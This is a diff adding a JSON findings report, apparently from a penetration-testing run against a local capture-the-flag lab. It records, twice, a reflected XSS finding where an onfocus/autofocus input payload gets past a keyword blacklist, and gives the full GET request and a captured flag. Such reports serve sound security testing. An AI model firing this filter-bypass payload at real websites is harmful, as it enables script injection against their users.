@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T21:07:06.372759+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "aa405f1e-2233-4de5-9872-09d4efe0d795",
+      "timestamp": "2026-04-14T21:07:06.372654+00:00",
+      "title": "Reflected XSS via input onfocus/autofocus bypass",
+      "severity": "high",
+      "target": "http://172.17.0.1:49587/page",
+      "description": "The /page endpoint reflects the 'name' GET parameter into the HTML response without proper sanitization. A blacklist filter blocks common XSS vectors like 'script', 'onerror', 'onload', and single quotes, but the payload <input onfocus=alert(\"XSS\") autofocus> bypasses the filter and executes JavaScript.",
+      "evidence": "flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<input+onfocus=alert(\"XSS\")+autofocus> HTTP/1.1",
+        "expected": "Response contains successful XSS execution and flag"
+      }
+    },
+    {
+      "id": "a468aa33-4e14-4bfe-9e5c-3d9a4e1b122f",
+      "timestamp": "2026-04-14T21:07:06.394876+00:00",
+      "title": "Reflected XSS via input onfocus/autofocus bypass",
+      "severity": "high",
+      "target": "http://172.17.0.1:49587/page",
+      "description": "The /page endpoint reflects the 'name' GET parameter into the HTML response without proper sanitization. A blacklist filter blocks common XSS vectors like 'script', 'onerror', 'onload', and single quotes, but the payload <input onfocus=alert(\"XSS\") autofocus> bypasses the filter and executes JavaScript.",
+      "evidence": "flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<input+onfocus=alert(\"XSS\")+autofocus> HTTP/1.1",
+        "expected": "Response contains successful XSS execution and flag"
+      }
+    }
+  ],
+  "diagrams": []
+}
